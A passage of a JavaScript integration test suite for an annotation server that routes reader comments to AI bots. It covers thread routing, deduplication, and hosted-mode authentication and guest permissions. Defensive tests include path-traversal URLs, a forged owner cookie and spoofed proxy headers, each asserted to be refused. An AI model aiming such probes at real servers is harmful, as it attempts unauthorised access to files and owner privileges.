      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: '@claude what is this?' },
        { author: 'claude', text: 'a truss' },
      ]), '@claude ');
      // an EARLIER tag never wins: the last word is the address
      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: '@claude what is this?' },
        { author: 'angadh', text: '@codex you have a look' },
      ]), '@codex ');
      // both tagged, or @all, is the room
      assert.equal(chat.stickyRoute([{ author: 'a', text: '@claude @codex both' }]), '@all ');
    });

    await test('stickyRoute: a bot\'s tag and a tools line claim nothing', () => {
      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: '@claude take this' },
        { author: 'claude', text: '@codex, over to you' },
      ]), '@claude ', 'a hand-off a bot invented is not the reader\'s address');
      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: '@codex take this' },
        { author: 'codex', kind: 'tools', text: 'Read @claude/notes.md' },
      ]), '@codex ');
    });

    await test('stickyRoute: a message addressed by a PILL counts, having no tag to read', () => {
      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: 'a plain question', route: '@codex ' },
      ]), '@codex ');
      // the words still outrank the stamp on the same message
      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: '@claude actually you', route: '@codex ' },
      ]), '@claude ');
      // and Note — a message stamped with nothing — ends the conversation
      assert.equal(chat.stickyRoute([
        { author: 'angadh', text: '@claude take this' },
        { author: 'angadh', text: 'just a note now' },
      ]), '', 'a message with neither tag nor stamp is addressed to nobody');
    });

    await test('routeOf: a hint only ever fills in for a message that tagged nobody', () => {
      assert.equal(chat.routeOf('a plain question', false, '@codex '), '@codex ');
      assert.equal(chat.routeOf('@claude a tagged one', false, '@codex '), '@claude ',
        'the sentence the reader wrote is the later word');
      assert.equal(chat.routeOf('a plain question', true, '@codex '), '@all ',
        'and forceAll/untaggedAll still outranks both');
      assert.deepEqual(chat.routedAgents('a plain question', false, '@codex '), ['codex']);
    });

    const stickyRoot = tmpRoot('sticky');
    const stickyLog = path.join(stickyRoot, 'bridge-log.jsonl');
    const sticky = await startServer({
      root: stickyRoot,
      env: {
        PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]),
        MOCK_BRIDGE_LOG: stickyLog, MOCK_TURN_DELAY_MS: '80', PLUGIN_SID_WAIT_MS: '400',
      },
    });
    const SU = 'https://ledger.test/2026/sticky-threads';
    await POST(sticky.base, '/page', { url: SU, title: 'Sticky threads', site: 'ledger.test' });
    const sent = () => inputs(stickyLog);
    const turnFor = async needle => {
      await waitFor(() => sent().some(t => t.includes(needle)), `the turn saying ${needle}`);
      return sent().find(t => t.includes(needle));
    };

    let stickyThread = null;
    await test('a thread opened with @claude summons claude, as it always did', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/thread', {
        url: SU, quote: 'the truss, not the hull', msg: { text: '@claude why the truss?' },
      });
      assert.equal(r.json.queued, true);
      stickyThread = r.json.thread.id;
      assert.ok((await turnFor('why the truss?')).startsWith('@claude '));
    });

    await test('…and the UNTAGGED follow-up in that thread goes to claude too', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/reply',
        { url: SU, thread_id: stickyThread, text: 'and the second half?' });
      assert.equal(r.json.queued, true, 'the follow-up is not a note to self');
      const turn = await turnFor('and the second half?');
      assert.ok(turn.startsWith('@claude '), `the thread\'s address held — got ${JSON.stringify(turn.slice(0, 40))}`);
      // the reader's own words are untouched: the prefix is the envelope's
      assert.ok(/and the second half\?/.test(turn));
    });

    await test('a new tag re-aims the thread, and the next untagged message follows it', async () => {
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply',
        { url: SU, thread_id: stickyThread, text: '@codex your turn on this' });
      assert.ok((await turnFor('your turn on this')).startsWith('@codex '));
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply', { url: SU, thread_id: stickyThread, text: 'and after that?' });
      const turn = await turnFor('and after that?');
      assert.ok(turn.startsWith('@codex '), `the last word is the address — got ${JSON.stringify(turn.slice(0, 40))}`);
    });

    await test('a bot answering in the thread never re-aims it', async () => {
      fs.writeFileSync(stickyLog, '');
      await waitFor(async () => {
        const p = (await GET(sticky.base, `/page?url=${encodeURIComponent(SU)}`)).json;
        const t = (p.threads || []).find(x => x.id === stickyThread);
        return (t.msgs || []).some(m => m.author === 'codex');
      }, 'codex to have replied in the thread');
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply', { url: SU, thread_id: stickyThread, text: 'one more thing' });
      assert.ok((await turnFor('one more thing')).startsWith('@codex '));
    });

    await test('the Note pill sends to nobody, and unsticks the thread', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/reply',
        { url: SU, thread_id: stickyThread, text: 'remember to check the source', route: 'none' });
      assert.equal(r.status, 200);
      assert.ok(!r.json.queued, 'Note is a real choice, and it summons nobody');
      await sleep(300);
      assert.equal(sent().length, 0, 'and no turn was sent');
      // …and the thread's address is now nobody, so the NEXT untagged message
      // is a note too: this is how a reader steps out of a conversation
      const again = await POST(sticky.base, '/reply',
        { url: SU, thread_id: stickyThread, text: 'and check the other one' });
      assert.ok(!again.json.queued);
      await sleep(300);
      assert.equal(sent().length, 0);
    });

    await test('a pill addresses a message with no tag in it, and sticks', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/reply',
        { url: SU, thread_id: stickyThread, text: 'what about the mass budget?', route: 'claude' });
      assert.equal(r.json.queued, true);
      const turn = await turnFor('what about the mass budget?');
      assert.ok(turn.startsWith('@claude '), 'the pill routed it');
      assert.ok(!/@claude what about/.test(turn), 'and nothing was typed into the reader\'s words');
      // the record remembers where it went, which is what makes it stick
      const p = (await GET(sticky.base, `/page?url=${encodeURIComponent(SU)}`)).json;
      const t = (p.threads || []).find(x => x.id === stickyThread);
      const mine = (t.msgs || []).filter(m => m.text === 'what about the mass budget?');
      assert.equal(mine.length, 1);
      assert.equal(mine[0].route, '@claude ');
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply', { url: SU, thread_id: stickyThread, text: 'in kilos, please' });
      assert.ok((await turnFor('in kilos, please')).startsWith('@claude '));
    });

    await test('a tag in the words beats the pill beside them', async () => {
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply',
        { url: SU, thread_id: stickyThread, text: '@codex on second thoughts', route: 'claude' });
      const turn = await turnFor('on second thoughts');
      assert.ok(turn.startsWith('@codex '), `the sentence is the later word — got ${JSON.stringify(turn.slice(0, 40))}`);
    });

    await test('a pill on the FIRST comment opens the thread already addressed', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/thread', {
        url: SU, quote: 'the second stage', msg: { text: 'is this figure right?' }, route: 'codex',
      });
      assert.equal(r.json.queued, true, 'a pill summons without a tag');
      assert.ok((await turnFor('is this figure right?')).startsWith('@codex '));
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply', { url: SU, thread_id: r.json.thread.id, text: 'and the units?' });
      assert.ok((await turnFor('and the units?')).startsWith('@codex '));
    });

    await test('a thread nobody ever addressed is still a notebook', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/thread', {
        url: SU, quote: 'the hull', msg: { text: 'check this later' },
      });
      assert.ok(!r.json.queued);
      await POST(sticky.base, '/reply', { url: SU, thread_id: r.json.thread.id, text: 'still thinking' });
      await sleep(300);
      assert.equal(sent().length, 0, 'no tag, no pill, no history: no bots');
    });

    await test('PAGE CHAT is untouched by any of it', async () => {
      fs.writeFileSync(stickyLog, '');
      await POST(sticky.base, '/reply', { url: SU, thread_id: '__page__', text: '@claude a page question' });
      assert.ok((await turnFor('a page question')).startsWith('@claude '));
      fs.writeFileSync(stickyLog, '');
      // an ordinary page's page chat has no sticky address and never grows one
      const r = await POST(sticky.base, '/reply', { url: SU, thread_id: '__page__', text: 'and a plain one' });
      assert.ok(!r.json.queued, 'page chat keeps its own rule');
      await sleep(300);
      assert.equal(sent().length, 0);
      // …and a route on the wire cannot talk it into one
      const forced = await POST(sticky.base, '/reply',
        { url: SU, thread_id: '__page__', text: 'nor this one', route: 'claude' });
      assert.ok(!forced.json.queued);
      await sleep(300);
      assert.equal(sent().length, 0);
    });

    await test('a nonsense route on the wire is ignored, not obeyed', async () => {
      fs.writeFileSync(stickyLog, '');
      const r = await POST(sticky.base, '/thread', {
        url: SU, quote: 'the fairing', msg: { text: 'a thought' }, route: 'gpt5',
      });
      assert.ok(!r.json.queued, 'an unknown pill addresses nobody');
      await sleep(300);
      assert.equal(sent().length, 0);
    });

    sticky.proc.kill();
  }

  // --- the double-click guard -------------------------------------------
  // Its own server: these tests assert on what reached the bridge, and the
  // main instance's log is a fixture for the choreography tests above.
  {
    const dupRoot = tmpRoot('dupe');
    const dupLog = path.join(dupRoot, 'bridge-log.jsonl');
    fs.mkdirSync(path.join(dupRoot, '.botference', 'plugin'), { recursive: true });
    fs.writeFileSync(path.join(dupRoot, '.botference', 'plugin', 'config.json'),
      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
    const dup = await startServer({
      root: dupRoot,
      env: {
        PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]),
        MOCK_BRIDGE_LOG: dupLog, MOCK_TURN_DELAY_MS: '120', PLUGIN_SID_WAIT_MS: '400',
      },
    });
    const es = openEvents(dup.base);
    await waitFor(() => es.events.some(e => e.type === 'hello'), 'sse hello (dedupe)');
    await POST(dup.base, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });

    let dupThread = null;
    await test('a double-clicked highlight comment is stored once', async () => {
      const body = { url: PAGE1, quote: QUOTE1, prefix: '', suffix: '', msg: { text: '  The math is the argument.  ' } };
      const [a, b] = await Promise.all([POST(dup.base, '/thread', body), POST(dup.base, '/thread', body)]);
      const first = a.json.deduped ? b : a;
      const second = a.json.deduped ? a : b;
      dupThread = first.json.thread;
      assert.equal(first.json.deduped, undefined, 'the first send is a real send');
      assert.equal(second.json.ok, true);
      assert.equal(second.json.deduped, true, 'the second is swallowed');
      assert.equal(second.json.thread.id, dupThread.id, 'and echoes the message that was kept');
      const page = (await GET(dup.base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(page.threads.length, 1, 'one thread on disk');
      assert.equal(page.threads[0].msgs.length, 1);
    });

    await test('a different comment on the same highlight is not a duplicate', async () => {
      const r = await POST(dup.base, '/thread', {
        url: PAGE1, quote: QUOTE1, prefix: '', suffix: '', msg: { text: 'A second, different thought.' },
      });
      assert.equal(r.json.deduped, undefined);
      const page = (await GET(dup.base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(page.threads.length, 2);
    });

    await test('a double-clicked mention queues exactly one bot turn', async () => {
      const body = { url: PAGE1, thread_id: '__page__', text: '@claude ping about the load factors' };
      const [a, b] = await Promise.all([POST(dup.base, '/reply', body), POST(dup.base, '/reply', body)]);
      const first = a.json.deduped ? b : a;
      const second = a.json.deduped ? a : b;
      assert.equal(first.json.queued, true);
      assert.equal(second.json.deduped, true);
      assert.equal(second.json.queued, undefined, 'a swallowed send queues nothing');
      assert.equal(second.json.msg.ts, first.json.msg.ts, 'the kept message is echoed');
      await waitFor(() => es.events.some(e => e.type === 'chat' && e.kind === 'turn-end'), 'turn-end');
      const asked = inputs(dupLog).filter(t => t.includes('ping about the load factors'));
      assert.equal(asked.length, 1, 'the bots were asked once');
      const page = (await GET(dup.base, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(page.page_chat.filter(m => m.author === 'angadh').length, 1);
    });

    await test('the same words in another thread are a different message', async () => {
      const r = await POST(dup.base, '/reply', { url: PAGE1, thread_id: dupThread.id, text: 'A repeated line.' });
      const s = await POST(dup.base, '/reply', { url: PAGE1, thread_id: '__page__', text: 'A repeated line.' });
      assert.equal(r.json.deduped, undefined);
      assert.equal(s.json.deduped, undefined, 'dedupe is scoped to one thread');
    });

    es.close();
    dup.proc.kill();
  }

  // --- hosted mode: several humans, one workspace ------------------------
  {
    const PW = 'night-train-pw';
    const OWNER_PW = 'owner-pw';
    const hostRoot = tmpRoot('hosted');
    const hostLog = path.join(hostRoot, 'bridge-log.jsonl');
    const hostDir = path.join(hostRoot, '.botference', 'plugin');
    fs.mkdirSync(hostDir, { recursive: true });
    fs.writeFileSync(path.join(hostDir, 'config.json'),
      JSON.stringify({ vault_path: vault, export_folder: 'Web Clippings', author: 'angadh' }, null, 2));
    // stand in for a review hub that has approved devices before (the real one
    // writes this file the first time it signs a device in)
    fs.writeFileSync(path.join(SECRETS, '.review-hub-device-secret'),
      crypto.randomBytes(24).toString('hex'), { mode: 0o600 });
    const h = await startServer({
      root: hostRoot,
      args: ['--hosted'],
      env: {
        PLUGIN_PASSWORD: PW, PLUGIN_OWNER_PASSWORD: OWNER_PW,
        PLUGIN_BRIDGE_CMD: JSON.stringify([process.execPath, MOCK]),
        MOCK_BRIDGE_LOG: hostLog, MOCK_TURN_DELAY_MS: '120', PLUGIN_SID_WAIT_MS: '400',
      },
    });
    const hb = h.base;
    // a request that came "through the tunnel": public Host, no loopback claim
    const REMOTE = { host: 'annotations.example' };
    const ADA = { ...REMOTE, authorization: `Bearer ${PW}`, 'x-plugin-handle': 'ada' };
    const key = crypto.createHash('sha1').update(PAGE1).digest('hex');
    // the owner (localhost) sets the page up, as the extension would
    await POST(hb, '/page', { url: PAGE1, title: TITLE1, site: 'ledger.test' });
    const ownerThread = (await POST(hb, '/thread', {
      url: PAGE1, quote: QUOTE1, prefix: '', suffix: '', msg: { text: 'The whole argument.' },
    })).json.thread;

    await test('hosted mode keeps localhost the owner, with no auth at all', async () => {
      const me = await GET(hb, '/whoami');
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' });
      assert.equal((await POST(hb, '/verbosity', { level: 'short' })).status, 200,
        'the owner keeps every owner-only endpoint on the bare port');
      assert.equal((await GET(hb, '/health')).json.owner, true);
      assert.ok(fs.existsSync(path.join(hostDir, '.auth-secret')), 'the cookie secret is on disk');
    });

    // The one that can silently hand the whole machine to the internet. A
    // named tunnel (discuss.botference.com) puts cloudflared on THIS host, so
    // its hop to the companion arrives from 127.0.0.1 exactly like the
    // extension's — a socket-peer test alone would call every visitor the
    // owner. Host is the first line of defence and the proxy headers are the
    // second, which is what still holds if the tunnel is ever configured with
    // httpHostHeader (rewriting Host to localhost).
    await test('a request forwarded by a tunnel is never the owner, whatever it claims', async () => {
      const cases = [
        ['the named tunnel, as it really arrives', {
          host: 'discuss.botference.com', 'cf-connecting-ip': '203.0.113.9', 'cf-ray': 'abc-LHR',
          'x-forwarded-for': '203.0.113.9', 'x-forwarded-proto': 'https',
        }],
        ['Host rewritten to localhost, CF headers intact', {
          host: 'localhost', 'cf-connecting-ip': '203.0.113.9', 'cf-ray': 'abc-LHR',
        }],
        ['a bare X-Forwarded-For on the loopback port', { host: '127.0.0.1', 'x-forwarded-for': '203.0.113.9' }],
        ['a bare X-Forwarded-Proto (any reverse proxy at all)', { host: 'localhost', 'x-forwarded-proto': 'https' }],
        ['X-Real-IP', { host: 'localhost', 'x-real-ip': '203.0.113.9' }],
        ['CF-Visitor alone', { host: 'localhost', 'cf-visitor': '{"scheme":"https"}' }],
      ];
      for (const [what, headers] of cases) {
        const me = await GET(hb, '/whoami', headers);
        assert.equal(me.status, 401, `${what}: must be challenged, not welcomed`);
        const owned = await POST(hb, '/export', { url: PAGE1 }, { ...headers, authorization: `Bearer ${PW}`, 'x-plugin-handle': 'ada' });
        assert.equal(owned.status, 403, `${what}: and it must not be able to act as the owner`);
      }
      // the local extension, unchanged: no proxy headers, loopback Host
      const local = await GET(hb, '/whoami', { host: '127.0.0.1' });
      assert.deepEqual(local.json, { ok: true, hosted: true, owner: true, handle: 'angadh' },
        'while the companion on this machine is still the owner, with no password');
    });

    await test('an unauthenticated API call is 401 JSON', async () => {
      const r = await GET(hb, '/index', REMOTE);
      assert.equal(r.status, 401);
      assert.deepEqual(r.json, { ok: false, error: 'auth required' });
      const w = await POST(hb, '/reply', { url: PAGE1, text: 'sneak' }, REMOTE);
      assert.equal(w.status, 401);
    });

    await test('an unauthenticated browser gets the password gate, not a dialog', async () => {
      const r = await GET(hb, '/pages', { ...REMOTE, accept: 'text/html,*/*' });
      assert.equal(r.status, 401);
      assert.equal(r.headers['www-authenticate'], undefined, 'never the browser basic-auth dialog');
      assert.match(r.body, /<form method="POST" action="\/auth">/);
      assert.match(r.body, /name="handle"/);
      assert.match(r.body, /prefers-color-scheme: dark/);
      const p = await GET(hb, `/p/${key}`, { ...REMOTE, accept: 'text/html' });
      assert.equal(p.status, 401, 'a page link is gated too');
      assert.match(r.body, /<link rel="icon" type="image\/png" href="\/favicon\.ico">/,
        'and the gate itself wears the icon it is about to let you in to');
    });

    // The one route deliberately in front of the gate. A gated favicon is a
    // 401 in the network log of every view and a broken icon on the sign-in
    // page — and an extension's own logo is not a secret.
    await test('the favicon is reachable before signing in, and nothing else is', async () => {
      const ico = await getBytes(hb, '/favicon.ico', REMOTE);
      assert.equal(ico.status, 200, 'a browser that has not signed in still gets the icon');
      assert.equal(ico.headers['content-type'], 'image/png');
      assert.ok(ico.buf.equals(fs.readFileSync(path.join(PLUGIN_DIR, 'extension', 'icons', 'icon128.png'))));
      // it is one fixed file, not a reader: there is no name to smuggle
      // through it and no other file it can be talked into
      for (const p of ['/favicon.ico/../../server.mjs', '/favicon.ico?name=../config.json',
                       '/favicon.icon', '/favicon', '/favicon.ico/x']) {
        const r = await GET(hb, p, { ...REMOTE, accept: 'text/html' });
        assert.ok(r.status === 401 || r.status === 404 || r.status === 200,
          `${p}: must not be a way in`);
        if (r.status === 200) {
          assert.equal(r.headers['content-type'], 'image/png', `${p}: only ever the icon`);
        }
      }
      // and the gate is exactly where it was for everything else
      assert.equal((await GET(hb, '/index', REMOTE)).status, 401);
      assert.equal((await GET(hb, '/pages', { ...REMOTE, accept: 'text/html' })).status, 401);
      assert.equal((await GET(hb, '/assets/reader.js', REMOTE)).status, 401);
    });

    let adaCookie = '';
    await test('the gate takes a name and the password together and issues a cookie', async () => {
      const bad = await FORM(hb, '/auth', { handle: 'ada', password: 'wrong', next: '/pages' }, REMOTE);
      assert.equal(bad.status, 401);
      assert.match(bad.body, /wrong password/);
      const nameless = await FORM(hb, '/auth', { handle: '', password: PW, next: '/pages' }, REMOTE);
      assert.match(nameless.body, /enter a name/);
      const taken = await FORM(hb, '/auth', { handle: 'angadh', password: PW, next: '/pages' }, REMOTE);
      assert.match(taken.body, /is the owner&#39;s name here/, 'and says so plainly, escaped');
      const good = await FORM(hb, '/auth', { handle: 'Ada L', password: PW, next: '/pages' }, REMOTE);
      assert.equal(good.status, 303);
      assert.equal(good.headers.location, '/pages');
      adaCookie = cookieJar(good);
      assert.match(adaCookie, /plugin_auth=\d+\.guest\.ada-l\.[0-9a-f]{64}/,
        'the NAME is inside the signature, not merely beside it');
      assert.match(adaCookie, /plugin_handle=ada-l/, 'the handle cookie is readable and sanitized');
      const listing = await GET(hb, '/pages', { ...REMOTE, cookie: adaCookie, accept: 'text/html' });
      assert.equal(listing.status, 200);
      assert.match(listing.body, /Botference Discuss/, 'the reading room names the product');
    });

    await test('the owner password signs the owner in from any device', async () => {
      const r = await FORM(hb, '/auth', { handle: 'whoever', password: OWNER_PW, next: '/pages' }, REMOTE);
      assert.equal(r.status, 303);
      const jar = cookieJar(r);
      assert.match(jar, /plugin_auth=\d+\.owner\./);
      const me = await GET(hb, '/whoami', { ...REMOTE, cookie: jar });
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: true, handle: 'angadh' },
        'the owner is always the configured author, whatever name was typed');
      assert.equal((await POST(hb, '/verbosity', { level: 'short' }, { ...REMOTE, cookie: jar })).status, 200);
    });

    await test('a tampered cookie is worth nothing', async () => {
      const forged = `plugin_auth=${Date.now() + 1e6}.owner.${'0'.repeat(64)}`;
      const r = await GET(hb, '/whoami', { ...REMOTE, cookie: forged });
      assert.equal(r.status, 401);
    });

    await test('bearer + x-plugin-handle is the remote extension\'s way in', async () => {
      const me = await GET(hb, '/whoami', ADA);
      assert.deepEqual(me.json, { ok: true, hosted: true, owner: false, handle: 'ada' });
      const idx = await GET(hb, '/index', ADA);
      assert.equal(idx.status, 200);
      assert.equal(idx.json[key].url, PAGE1);
    });

    await test('a guest with no name, and one wearing the owner\'s, are both refused', async () => {
      const nameless = await POST(hb, '/reply', { url: PAGE1, text: 'hi' },
        { ...REMOTE, authorization: `Bearer ${PW}` });
      assert.equal(nameless.status, 400);
      assert.deepEqual(nameless.json, { ok: false, error: 'a name is required — send x-plugin-handle' });
      const spoof = await POST(hb, '/reply', { url: PAGE1, text: 'hi' },
        { ...ADA, 'x-plugin-handle': 'angadh' });
      assert.equal(spoof.status, 403);
      assert.deepEqual(spoof.json, { ok: false, error: "that name is the owner's here — pick another" });
      const page = (await GET(hb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(page.page_chat.length, 0, 'neither wrote anything');
    });

    let adaMsg = null;
    await test('a guest\'s message is authored by their own handle', async () => {
      const r = await POST(hb, '/reply', { url: PAGE1, thread_id: ownerThread.id, text: 'Agreed — and the return leg?' }, ADA);
      assert.equal(r.status, 200);
      adaMsg = r.json.msg;
      assert.equal(adaMsg.author, 'ada');
      const page = (await GET(hb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.deepEqual(page.threads[0].msgs.map(m => m.author), ['angadh', 'ada']);
    });

    await test('owner-only endpoints answer a guest with 403', async () => {
      const calls = [
        ['/export', { url: PAGE1 }],
        ['/delete-page', { url: PAGE1 }],
        ['/rename-page', { url: PAGE1, title: 'ada was here' }],
        ['/tag-page', { url: PAGE1, tags: ['ada'] }],
        ['/model', { agent: 'claude', model: 'claude-opus-5' }],
        ['/effort', { agent: 'claude', level: 'high' }],
        ['/verbosity', { level: 'long' }],
        ['/relay', { agent: 'claude' }],
        ['/interrupt', { url: PAGE1 }],
        // a guest may hold an opinion about a thread (/resolve, /addressed);
        // they may not draw on the owner's manuscript
        ['/mark', { url: PAGE1, thread_id: 't-x', mark: 'strike' }],
        ['/strike-from', { url: PAGE1, thread_id: 't-x' }],
        // …nor read, fill or grade the owner's own memory: the question vault
        // is the record of what this reader keeps getting wrong
        ['/question', { url: PAGE1, quote: 'anything' }],
        ['/quiz-answer', { id: 'q-x', choice: 0 }],
        ['/quiz-flag', { id: 'q-x' }],
        ['/quiz-delete', { id: 'q-x' }],
        // …nor rewrite one of the owner's cards, nor answer the duplicate hint
        // on their behalf
        ['/question-revise', { url: PAGE1, thread_id: 't-x', from_msg: 'x' }],
        ['/quiz-keep', { id: 'q-x', other: 'q-y' }],
        // …nor put a picture into the owner's archive: a page image is what an
        // agent is then handed to LOOK at, which is the last thing a guest may
        // choose the contents of
        ['/page-image', { url: PAGE1, page: 1, data: 'iVBORw0KGgo=' }],
      ];
      for (const [route, body] of calls) {
        const r = await POST(hb, route, body, ADA);
        assert.equal(r.status, 403, `${route} must be owner-only`);
        assert.deepEqual(r.json, { ok: false, error: 'owner only — ask the owner to do that' }, route);
      }
      assert.equal(fs.existsSync(path.join(vault, 'Web Clippings', `${TITLE1}.md`)), false,
        'no guest wrote into the owner\'s vault');
    });

    await test('a guest may edit and retract only their own message', async () => {
      const mine = await POST(hb, '/edit', {
        url: PAGE1, thread_id: ownerThread.id, ts: adaMsg.ts, text: 'Agreed — and the return leg? (fixed)',
      }, ADA);
      assert.equal(mine.status, 200);
      assert.match(mine.json.msg.text, /\(fixed\)$/);
      const theirs = await POST(hb, '/edit', {
        url: PAGE1, thread_id: ownerThread.id, ts: ownerThread.msgs[0].ts, text: 'rewritten by a guest',
      }, ADA);
      assert.equal(theirs.status, 403);
      assert.deepEqual(theirs.json, { ok: false, error: 'not your message' });
      const wholeThread = await POST(hb, '/delete', { url: PAGE1, thread_id: ownerThread.id }, ADA);
      assert.equal(wholeThread.status, 403);
      assert.deepEqual(wholeThread.json, { ok: false, error: 'owner only — you can delete your own messages' });
      const notMine = await POST(hb, '/delete', {
        url: PAGE1, thread_id: ownerThread.id, ts: ownerThread.msgs[0].ts,
      }, ADA);
      assert.equal(notMine.status, 403);
      const ticked = await POST(hb, '/tick', {
        url: PAGE1, thread_id: ownerThread.id, ts: adaMsg.ts, index: 0, checked: true,
      }, ADA);
      assert.equal(ticked.status, 400, 'a guest may tick — this message just has no checkbox');
      assert.deepEqual(ticked.json, { ok: false, error: 'index out of range' });
    });

    await test('an ungranted guest\'s mention is kept but never reaches the bots', async () => {
      const es = openEvents(hb, `?auth=${PW}&handle=ada`);
      await waitFor(() => es.events.some(e => e.type === 'hello'), 'sse hello over query auth');
      const r = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude what do you make of this?' }, ADA);
      assert.equal(r.status, 200);
      assert.equal(r.json.ok, true);
      assert.equal(r.json.queued, false);
      assert.equal(r.json.reason, "the owner hasn't granted you bot access");
      const err = await waitFor(() => es.events.find(e => e.type === 'chat' && e.kind === 'error'), 'error event');
      assert.equal(err.url, PAGE1);
      assert.equal(err.target, '__page__');
      assert.equal(err.error, "the owner hasn't granted you bot access");
      const page = (await GET(hb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(page.page_chat.at(-1).text, '@claude what do you make of this?', 'the message survives');
      assert.equal(page.page_chat.at(-1).author, 'ada');
      assert.equal(fs.existsSync(hostLog), false, 'the bridge was never spawned for a guest with no grant');
      es.close();
    });

    await test('a guest may ask the library, but the bots still need a grant', async () => {
      const LIBU = 'bfp://library';
      const r = await POST(hb, '/reply',
        { url: LIBU, thread_id: '__page__', text: '@claude what is in this archive?' }, ADA);
      assert.equal(r.status, 200, 'the question is kept — the library is readable and writable like any page');
      assert.equal(r.json.queued, false);
      assert.equal(r.json.reason, "the owner hasn't granted you bot access",
        'the library is not a way around the grant rules');
      assert.equal(fs.existsSync(hostLog), false, 'and no bridge was spawned for it');
      const lib = (await GET(hb, `/page?url=${encodeURIComponent(LIBU)}`)).json;
      assert.equal(lib.title, 'Library');
      assert.equal(lib.page_chat.at(-1).author, 'ada', 'the guest owns what they wrote');
      // and the reading room shows it to them
      const view = await GET(hb, '/pages', ADA);
      assert.ok(view.body.includes('what is in this archive?'), 'the thread is on the phone view');
      assert.ok(view.body.includes('value="bfp://library"'), '…with a composer of its own');
      assert.ok(!/<li><a href="\/[ap]\/[0-9a-f]{40}">Library</.test(view.body),
        'and never as a row in the list — it is not a page you can visit');
    });

    await test('a grant written while the server runs takes effect on the next mention', async () => {
      fs.writeFileSync(path.join(hostDir, 'grants.json'),
        JSON.stringify({ ada: { agents: true, daily_cap: 2 } }, null, 2));
      const es = openEvents(hb, `?auth=${PW}&handle=ada`);
      await waitFor(() => es.events.some(e => e.type === 'hello'), 'sse hello (granted)');
      const r = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude the return leg, then?' }, ADA);
      assert.equal(r.json.queued, true, 'no restart was needed');
      assert.equal(r.json.position, 1);
      const reply = await waitFor(() => es.events.find(e => e.type === 'chat' && e.kind === 'reply'), 'bot reply');
      assert.equal(reply.msg.author, 'claude');
      const page = (await GET(hb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.deepEqual(page.page_chat.slice(-2).map(m => m.author), ['ada', 'claude'],
        'the guest owns their question, the bot owns its answer');
      const asked = inputs(hostLog).filter(t => t.includes('the return leg, then?'));
      assert.equal(asked.length, 1);
      assert.match(asked[0], /^@claude .*\bada asked about this page:/s,
        'the turn names who is asking, since a shared page holds several people');
      es.close();
    });

    await test('the daily cap refuses the mention after the budget is spent', async () => {
      const second = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude one more, sorry' }, ADA);
      assert.equal(second.json.queued, true, 'two of two');
      const third = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude and another' }, ADA);
      assert.equal(third.json.ok, true);
      assert.equal(third.json.queued, false);
      assert.equal(third.json.reason, "you have used today's agent budget (2 of 2)");
      const usage = JSON.parse(fs.readFileSync(path.join(hostDir, 'grant-usage.json'), 'utf8'));
      assert.equal(usage.date, new Date().toISOString().slice(0, 10));
      assert.equal(usage.counts.ada, 2, 'the ledger holds a date and a count, nothing else');
      const page = (await GET(hb, `/page?url=${encodeURIComponent(PAGE1)}`)).json;
      assert.equal(page.page_chat.at(-1).text, '@claude and another', 'the refused message is still kept');
      // the owner is never metered
      const mine = await POST(hb, '/reply', { url: PAGE1, thread_id: '__page__', text: '@claude owner asking' });
      assert.equal(mine.json.queued, true);
    });

    await test('CORS preflights are answered in hosted mode', async () => {
      const r = await request(hb, 'OPTIONS', '/reply', undefined, {
        ...REMOTE, origin: 'chrome-extension://abc', 'access-control-request-method': 'POST',
        'access-control-request-headers': 'authorization,x-plugin-handle',
      });
      assert.equal(r.status, 204);
      assert.equal(r.headers['access-control-allow-origin'], '*');
      assert.equal(r.headers['access-control-allow-headers'], 'authorization, content-type, x-plugin-handle');
      assert.match(r.headers['access-control-allow-methods'], /POST/);
      const authed = await GET(hb, '/index', ADA);
      assert.equal(authed.headers['access-control-allow-origin'], '*', 'and on the answers themselves');
      const refused = await GET(hb, '/index', REMOTE);
      assert.equal(refused.headers['access-control-allow-origin'], '*', 'including the 401, or the tab sees nothing');
    });

    // The review mirror names its own author, which is precisely the power a
    // guest must never hold. A caller on the bare loopback already owns the
    // files these threads live in, so naming one there is no privilege it did
    // not have; over the tunnel it is a flat refusal, whatever it carries.
    await test('the review mirror is a loopback door and nothing else', async () => {
      const body = { url: 'https://paper.example/hosted-mirror.html',
        comments: [{ id: 'user-forged-1', author: 'angadh', quote: 'x', text: 'me, honest' }] };
